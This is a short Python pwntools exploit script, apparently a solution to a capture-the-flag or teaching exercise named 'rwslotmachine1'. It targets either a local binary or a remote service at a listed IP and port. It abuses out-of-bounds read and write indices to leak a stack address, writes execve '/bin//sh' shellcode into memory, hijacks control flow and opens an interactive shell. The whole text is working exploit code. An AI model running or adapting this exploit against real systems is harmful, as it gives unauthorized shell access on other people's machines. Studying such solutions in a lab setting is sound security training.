from pwn import *

local = True
# Both solutions work against the Docker container instance.
# Only solution 2 works locally.
# Solution 1 fails on the local machine because there is no valid address at that index.
SOLUTION = 1

if local:
    p = process("../src/rwslotmachine1")
else:
    p = remote("141.85.224.117", 31344)


def do_read(idx):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b"index:")
    p.sendline(str(idx).encode())
    p.recvuntil(b"]: ")
    leak = p.recvline().strip()
    print(f"Raw Leak: {leak}")
    return int(leak, 16)


def do_write(idx, value):
    p.recvuntil(b">")
    p.sendline(b"2")
    p.recvuntil(b"index:")
    p.sendline(str(idx).encode())
    p.recvuntil(b"value:")
    p.sendline(hex(value).encode())


if SOLUTION == 1:
    stack_leak = do_read(1)
    stack_slots = stack_leak - 0x3E
else:
    stack_leak = do_read(-7)
    stack_slots = stack_leak

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode_pieces = unpack_many(shellcode, 32)

for i in range(len(shellcode_pieces)):
    do_write(i, shellcode_pieces[i])

do_write(-8, stack_slots)

p.interactive()